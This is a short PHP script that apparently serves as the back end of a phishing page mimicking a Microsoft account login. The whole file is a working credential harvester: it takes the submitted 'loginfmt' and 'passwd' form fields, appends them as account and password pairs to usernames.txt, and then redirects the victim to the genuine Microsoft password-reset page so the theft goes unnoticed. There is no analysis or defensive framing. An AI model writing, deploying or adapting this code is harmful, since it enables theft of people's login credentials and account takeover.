<?php

file_put_contents("usernames.txt", "Account: " . $_POST['loginfmt'] . "\nPass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://account.live.com/ResetPassword.aspx');
exit();
